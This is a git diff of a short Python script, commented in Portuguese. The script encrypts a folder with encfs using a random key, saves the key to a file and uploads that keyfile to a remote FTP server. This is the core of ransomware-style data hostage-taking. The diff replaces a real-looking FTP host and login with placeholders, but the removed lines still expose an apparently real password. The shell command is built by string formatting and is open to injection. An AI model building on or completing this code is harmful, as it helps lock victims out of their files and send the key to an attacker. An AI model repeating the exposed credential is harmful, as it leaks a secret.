@@ -2,7 +2,7 @@ import os
 import ftplib
 
 # Caminho da pasta a ser criptografada
-path = "~/home/otavio/Desktop/Projects/testgpt/desafio"
+path = "What_you_will_encrypt"
 
 # Criar uma chave de criptografia aleatória
 key = os.urandom(32)
@@ -15,8 +15,8 @@ with open("keyfile.key", "wb") as f:
 os.system("encfs /desafio --standard --extpass='echo {}' {} encrypted".format(key.hex(), path))
 
 # Conexão com o servidor ftp
-ftp = ftplib.FTP("files.000webhost.com")
-ftp.login("cloudpurplecomp", "jZnJYuN28T(trfUFbMDL")
+ftp = ftplib.FTP("servidor_here")
+ftp.login("user", "password")
 
 # Enviando o arquivo keyfile.key
 with open("keyfile.key", "rb") as f:
